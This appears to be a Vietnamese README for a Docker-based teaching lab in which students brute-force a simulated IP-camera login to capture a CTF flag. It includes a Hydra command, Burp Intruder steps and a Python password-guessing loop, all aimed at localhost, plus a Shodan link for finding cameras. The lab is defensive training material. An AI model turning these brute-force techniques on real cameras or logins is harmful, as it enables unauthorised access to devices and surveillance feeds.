
# 🔓 Brute Force Camera Lab

## 🧠 Mục tiêu học tập

Trong bài lab này, học viên sẽ được thực hành tấn công brute force trên một hệ thống giả lập giao diện đăng nhập của Camera IP. Mô hình này được thiết kế sát với thực tế: nhiều camera trên thị trường (Dahua, Hikvision, v.v.) thường sử dụng **tài khoản mặc định** như `admin:admin` hoặc `admin:12345`.

### 🎯 Mục đích:
- Hiểu rõ về **rủi ro khi dùng mật khẩu mặc định**.
- Hiểu cách **brute force** hoạt động ở tầng HTTP.
- Sử dụng công cụ như **Burp Suite** và **Hydra** để tấn công.
- Xác thực kỹ thuật brute force trên một mô hình thật.

---

## 🏗️ Cấu trúc thư mục

```
bruteforce-camera-lab/
├── docker-compose.yml         # Cấu hình dịch vụ Docker
├── Dockerfile                 # Build container PHP + Apache
├── html/
│   ├── index.php              # Trang giới thiệu và mở đầu bài học
│   ├── camera-login.php       # Trang login giống camera IP
│   ├── validate.php           # Xử lý login + hiệu ứng pháo hoa khi thành công
│   ├── flag.txt               # Flag CTF sau khi đăng nhập thành công
│   └── common/
│       ├── style.css          # Giao diện chung
│       └── style-validate.css # Giao diện tung hoa khi lấy được flag
```

---

## 🚀 Cài đặt & chạy lab bằng Docker

### ✅ Yêu cầu:

- Docker & Docker Compose đã cài sẵn.

### ▶️ Các bước chạy:

```bash
git clone https://github.com/your-user/bruteforce-camera-lab.git
cd bruteforce-camera-lab
docker-compose up --build
```

Mở trình duyệt và truy cập: [http://localhost:8080](http://localhost:8080)

---

## 💡 Mô tả các trang

### 🔹 `index.php`

- Trang giới thiệu case study tấn công camera IP với tài khoản mặc định.
- Có nút chuyển sang trang đăng nhập.

### 🔹 `camera-login.php`

- Giao diện login mô phỏng thiết bị camera IP.
- Có xử lý thông báo lỗi khi sai mật khẩu.

### 🔹 `validate.php`

- Kiểm tra tài khoản đăng nhập.
- Nếu đúng, hiển thị flag + hiệu ứng pháo hoa.
- Nếu sai, chuyển về lại `camera-login.php`.

---

## 🧪 Thực hành Brute Force

### 🔍 Phân tích

Trang `camera-login.php` có form POST:

```html
<form method="POST" action="validate.php">
  <input name="username">
  <input name="password">
</form>
```

Username/password hợp lệ: `admin:12345`

---

### 🛠️ Gợi ý tấn công bằng Hydra

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost http-post-form "/camera-login.php:username=^USER^&password=^PASS^:Sai username hoặc password"
```

> ✅ Nếu thành công: bạn sẽ thấy thông báo flag từ `validate.php`.

---

### 🐞 Gợi ý Burp Suite (Intruder)

1. Mở Burp và bật proxy.
2. Truy cập `camera-login.php` và nhập thử thông tin bất kỳ.
3. Gửi request sang Intruder.
4. Gán payload cho `password=...`.
5. Dùng wordlist ví dụ: `rockyou.txt`.
6. Quan sát response và xác định login thành công (status, content, không chứa chuỗi "Sai username").

---

## 🖼️ Mô phỏng thật

- Cổng `8080`: camera thật thường dùng các port 80, 8080, 554...
- Login form: không có captcha, không rate-limit — để tiện brute-force.
- Giao diện: đen, font monospace, tối giản giống webconfig thiết bị.

---

## 🏁 Flag

Sau khi brute force thành công, bạn sẽ thấy flag như:

```
🎉 Truy cập thành công!
Flag: FLAG{bruteforce_success_camera}
```

---

## 📚 Tài liệu tham khảo

- [Hydra - Kali Linux Tools](https://tools.kali.org/password-attacks/hydra)
- [Burp Suite Intruder Docs](https://portswigger.net/burp/documentation/desktop/tools/intruder)
- [Shodan Search for Cameras](https://www.shodan.io/search?query=camera)

---

## 📌 Ghi chú

- Mật khẩu mặc định trong `validate.php` là `12345`. Bạn có thể đổi trong code.
- Đây là lab mô phỏng giáo dục, **tuyệt đối không dùng để tấn công thực tế**.
- Nếu muốn nâng cấp: thêm Captcha, giới hạn login, delay brute-force...

---

## 👨‍🏫 Giảng viên có thể...

- Giao bài: "Tìm mật khẩu đúng để lấy flag".
- Hướng dẫn cách viết script brute-force bằng Python/requests.
- Mở rộng lab: thêm Basic Auth, cookie check, AJAX login.

---

## 🧠 Challenge nâng cao (tuỳ chọn)

> Viết tool Python brute-force login:
```python
import requests

url = "http://localhost:8080/validate.php"
for pwd in ["123", "admin", "12345", "password"]:
    r = requests.post(url, data={"username": "admin", "password": pwd})
    if "Flag" in r.text:
        print(f"[+] Found: {pwd}")
        break
```

---

## 📬 Liên hệ / Đóng góp

Nếu bạn thấy lab này hữu ích, hãy fork, chỉnh sửa và chia sẻ với cộng đồng học an toàn thông tin!

---
